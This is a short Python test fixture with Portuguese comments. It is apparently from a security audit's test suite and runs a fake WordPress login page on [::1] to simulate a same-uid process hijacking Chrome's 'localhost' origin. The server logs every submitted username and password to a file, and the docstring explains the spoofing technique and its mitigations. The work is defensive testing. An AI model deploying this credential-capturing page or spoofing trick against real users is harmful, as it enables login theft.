#!/usr/bin/python3 -I
"""Site falso na mesma origem `http://localhost:<porta>`, escutando só em `[::1]` (Fase 44c).

Ataque da auditoria de segurança do M6: o serviço de teste verdadeiro escuta só em
`127.0.0.1:<porta>`; um processo do mesmo uid abre `[::1]:<porta>` e o Chrome, que
tenta `::1` antes para `localhost`, carrega a página dele com a origem
`http://localhost:<porta>`, a mesma da entrada. A origem confere, então o daemon não tem
como distinguir; o que fecha é a confirmação da origem na janela (D9, Fase 44c) e, no
`ward playwright`, o `--host-resolver-rules=MAP localhost 127.0.0.1`.

Uso: falso_v6.py <porta> <arquivo de saída>. Grava o caminho e o corpo de cada POST no
arquivo (0600; a suíte confere que ficou vazio e nunca o imprime). A página tem
`<title>falso-v6</title>` para a suíte saber que a aba caiu aqui.
"""

import http.server
import os
import socket
import sys

PORTA = int(sys.argv[1])
SAIDA = sys.argv[2]

FORM = b"""<!doctype html><html><head><title>falso-v6</title></head><body>
<form method="post" action="/wp-login.php">
<input type="text" name="log" id="user_login" autocomplete="username">
<input type="password" name="pwd" id="user_pass">
<button type="submit">Entrar</button></form></body></html>"""


class Pagina(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        corpo = b"<html><head><title>falso-v6</title></head><body>painel</body></html>" \
            if self.path.startswith("/wp-admin") else FORM
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(corpo)))
        self.end_headers()
        self.wfile.write(corpo)

    def do_POST(self):
        n = int(self.headers.get("Content-Length", "0") or "0")
        corpo = self.rfile.read(min(n, 1 << 16))
        fd = os.open(SAIDA, os.O_WRONLY | os.O_APPEND | os.O_CREAT | os.O_NOFOLLOW, 0o600)
        with os.fdopen(fd, "ab") as f:
            f.write(self.path.encode() + b" " + corpo + b"\n")
        self.send_response(302)
        self.send_header("Location", "/wp-admin/")
        self.send_header("Content-Length", "0")
        self.end_headers()

    def log_message(self, *a):
        pass


class Servidor(http.server.ThreadingHTTPServer):
    address_family = socket.AF_INET6

    def server_bind(self):
        self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 1)
        super().server_bind()


Servidor(("::1", PORTA), Pagina).serve_forever()
